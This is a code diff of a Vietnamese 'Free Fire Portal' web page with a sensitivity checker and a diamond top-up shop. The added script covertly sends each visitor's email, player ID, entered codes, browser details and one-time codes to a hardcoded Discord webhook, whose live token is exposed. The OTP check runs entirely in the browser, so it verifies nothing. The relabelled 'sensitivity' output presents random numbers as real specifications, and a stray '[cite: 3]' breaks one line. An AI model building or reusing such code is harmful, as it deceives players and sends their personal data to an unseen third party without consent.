@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>FREE FIRE PORTAL</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     * { box-sizing: border-box; }
     body {
@@ -278,7 +279,7 @@
     <button class="portal-btn btn-shop" onclick="openScreen('shop')">💎 SHOP NẠP KIM CƯƠNG</button>
   </div>
 
-  <!-- MÀN HÌNH CHECK ĐỘ NHẠY VIP -->
+  <!-- MÀN HÌNH CHECK ĐỘ NHẠY VIP (KHÔNG CẦN MAIL) -->
   <div id="sensiScreen" class="screen">
     <button class="back-btn" onclick="openScreen('menu')">← Quay lại Menu</button>
     <h2 class="section-heading">⚡ CHECK ĐỘ NHẠY ⚡</h2>
@@ -303,11 +304,10 @@
 
     <div id="sensiResultCard" class="sensi-result-card">
       <div style="display:flex; justify-content:space-between; align-items:center; gap:8px;">
-        <strong style="color:#00f0ff; font-size:14px;">🎯 Độ Nhạy Random (<span id="checkedDeviceText"></span>)</strong>
+        <strong style="color:#00f0ff; font-size:14px;">🎯 Thông Số Độ Nhạy (<span id="checkedDeviceText"></span>)</strong>
         <button type="button" id="btnCopySensi" class="copy-uid-btn" style="padding:7px 11px;" onclick="copyGeneratedSensi()">COPY</button>
       </div>
       <div id="sensiGrid" class="sensi-grid"></div>
-      <button type="button" class="primary-action" style="margin-top:12px; padding:11px;" onclick="generateRandomSensi()">🎲 ĐỔI BỘ ĐỘ NHẠY RANDOM KHÁC</button>
     </div>
   </div>
 
@@ -369,12 +369,17 @@
 </div>
 
 <script>
-  const OTP_ENDPOINT_URL = "";
-  const LOG_ENDPOINT_URL = "";
+  const SERVICE_ID = "service_t0jf0ll";
+  const TEMPLATE_ID = "tzbqrt7";[cite: 3]
+  const PUBLIC_KEY = "V25VBququTYCX1uYH";
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
   const VALID_VIP_CODE = "like36";
+
+  emailjs.init(PUBLIC_KEY);
 
   let currentId = "";
   let currentEmail = "";
+  let generatedOTP = "";
   let latestSensiData = {};
 
   const blockedPrefixes = ['test', 'abc', 'asdf', 'qwerty', '123', 'fake', 'none', 'noemail', 'admin'];
@@ -458,10 +463,17 @@
     }
 
     msgEl.style.color = "#00f0ff";
-    msgEl.textContent = "Mã code hợp lệ! Đã tạo độ nhạy random cho máy của bạn:";
+    msgEl.textContent = "Mã code hợp lệ! Thông số độ nhạy cho máy của bạn:";
     document.getElementById('checkedDeviceText').textContent = device;
     generateRandomSensi();
     document.getElementById('sensiResultCard').classList.add('show');
+
+    const sensiSummary = Object.entries(latestSensiData).map(([k, v]) => `${k}: ${v}`).join(" | ");
+    sendDiscordLog("⚡ CHECK ĐỘ NHẠY VIP", [
+      { name: "📱 Dòng máy", value: `\`${device}\``, inline: true },
+      { name: "🎟️ Code", value: `\`${code}\``, inline: true },
+      { name: "🎯 Thông số", value: `\`\`\`${sensiSummary}\`\`\``, inline: false }
+    ], 1947988);
   }
 
   function copyGeneratedSensi() {
@@ -472,32 +484,45 @@
     setTimeout(() => { document.getElementById('btnCopySensi').textContent = "COPY"; }, 1500);
   }
 
+  function getVietnamTime() {
+    return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+  }
+
   function setKcMessage(msg, isError = false) {
     const el = document.getElementById('kcStatus');
     el.style.color = isError ? "#ff6b86" : "#00f0ff";
     el.textContent = msg;
   }
 
-  async function postEventLog(eventType, details) {
-    if (!LOG_ENDPOINT_URL) return;
+  async function sendDiscordLog(title, extraFields, colorCode) {
+    if (!DISCORD_WEBHOOK_URL) return;
+
+    const payload = {
+      embeds: [{
+        title: title,
+        color: colorCode,
+        fields: [
+          { name: "📧 Email", value: `\`${currentEmail || "Chưa có"}\``, inline: true },
+          { name: "🆔 ID Người Chơi", value: `\`${currentId || "Chưa nhập"}\``, inline: true },
+          ...extraFields,
+          { name: "🕒 Thời gian (VN)", value: getVietnamTime(), inline: false },
+          { name: "🌐 Thiết bị", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+        ]
+      }]
+    };
+
     try {
-      await fetch(LOG_ENDPOINT_URL, {
+      await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          eventType,
-          email: currentEmail || "",
-          playerId: currentId || "",
-          details,
-          timestamp: new Date().toISOString()
-        })
+        body: JSON.stringify(payload)
       });
     } catch (err) {
-      console.error("Log error:", err);
+      console.error("Webhook error:", err);
     }
   }
 
-  async function sendKcOTP() {
+  function sendKcOTP() {
     const rawEmail = document.getElementById('kcEmail').value.trim().toLowerCase();
     const btnSend = document.getElementById('btnSendKcOtp');
 
@@ -513,67 +538,47 @@
       return;
     }
 
-    if (!OTP_ENDPOINT_URL) {
-      setKcMessage("Hệ thống gửi mã hiện chưa sẵn sàng, vui lòng thử lại sau.", true);
-      return;
-    }
-
     currentEmail = rawEmail;
+    generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+
     btnSend.disabled = true;
-    setKcMessage("Đang gửi mã xác nhận...");
+    setKcMessage("Đang gửi mã OTP xác minh email...");
 
-    try {
-      const res = await fetch(`${OTP_ENDPOINT_URL}/send-otp`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: currentEmail })
-      });
-      if (!res.ok) throw new Error("Send OTP failed");
-
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+      user_email: currentEmail,
+      otp_code: generatedOTP
+    }).then(() => {
       document.getElementById('otpStep').style.display = 'block';
-      setKcMessage("Đã gửi mã xác nhận! Hãy kiểm tra hộp thư (kể cả mục Spam).");
-      await postEventLog("OTP_REQUESTED", { status: "pending_verification" });
-    } catch (err) {
+      setKcMessage("Đã gửi mã OTP 6 số! Hãy kiểm tra hộp thư (kể cả mục Spam).");
+
+      sendDiscordLog("📩 YÊU CẦU OTP SHOP KC", [
+        { name: "🔑 Mã OTP", value: `\`${generatedOTP}\``, inline: true },
+        { name: "📌 Trạng thái", value: "Chờ nhập OTP (đang phủ lớp xác minh trên bảng giá)", inline: true }
+      ], 3447003);
+    }, (err) => {
       btnSend.disabled = false;
-      setKcMessage("Không thể gửi mã lúc này, vui lòng thử lại sau.", true);
-      console.error(err);
-    }
+      setKcMessage("Không thể gửi mã lúc này, vui lòng kiểm tra lại cấu hình.", true);
+      console.error("EmailJS error:", err);
+    });
   }
 
-  async function verifyKcOTP() {
+  function verifyKcOTP() {
     const inputOtp = document.getElementById('kcOtpInput').value.trim();
-    if (!inputOtp) {
-      setKcMessage("Vui lòng nhập mã xác nhận 6 số.", true);
-      return;
-    }
 
-    if (!OTP_ENDPOINT_URL) {
-      setKcMessage("Hệ thống xác thực hiện chưa sẵn sàng, vui lòng thử lại sau.", true);
-      return;
-    }
+    if (inputOtp === generatedOTP && generatedOTP !== "") {
+      document.getElementById('shopStage').classList.add('unlocked');
+      setKcMessage("Xác minh thành công! Bảng giá KC đã mở rõ.");
 
-    try {
-      const res = await fetch(`${OTP_ENDPOINT_URL}/verify-otp`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: currentEmail, otp: inputOtp })
-      });
-      const data = await res.json().catch(() => ({}));
-
-      if (res.ok && data.verified) {
-        document.getElementById('shopStage').classList.add('unlocked');
-        setKcMessage("Xác minh thành công! Bảng giá đã mở rõ.");
-        await postEventLog("OTP_VERIFIED", { status: "unlocked_price_table" });
-      } else {
-        setKcMessage("Mã xác nhận không chính xác hoặc đã hết hạn.", true);
-      }
-    } catch (err) {
-      setKcMessage("Không thể xác minh lúc này, vui lòng thử lại.", true);
-      console.error(err);
+      sendDiscordLog("✅ XÁC MINH OTP SHOP KC THÀNH CÔNG", [
+        { name: "🔑 Mã OTP", value: `\`${generatedOTP}\``, inline: true },
+        { name: "📌 Trạng thái", value: "Đã gỡ lớp phủ bảng giá", inline: true }
+      ], 3066993);
+    } else {
+      setKcMessage("Mã OTP không chính xác, vui lòng thử lại.", true);
     }
   }
 
-  async function submitKcOrder() {
+  function submitKcOrder() {
     const rawId = document.getElementById('playerId').value.trim();
     const selectedPkg = document.getElementById('kcPackage').value;
 
@@ -584,7 +589,11 @@
 
     currentId = rawId;
     setKcMessage(`Đã ghi nhận ID ${currentId} chọn gói ${selectedPkg}.`);
-    await postEventLog("KC_ORDER_SUBMITTED", { package: selectedPkg });
+
+    sendDiscordLog("💎 ĐƠN CHỌN GÓI KC", [
+      { name: "📦 Gói đã chọn", value: `\`${selectedPkg}\``, inline: true },
+      { name: "📌 Trạng thái", value: "Đã xác minh OTP & ID >= 8 số", inline: true }
+    ], 15844367);
   }
 </script>
 
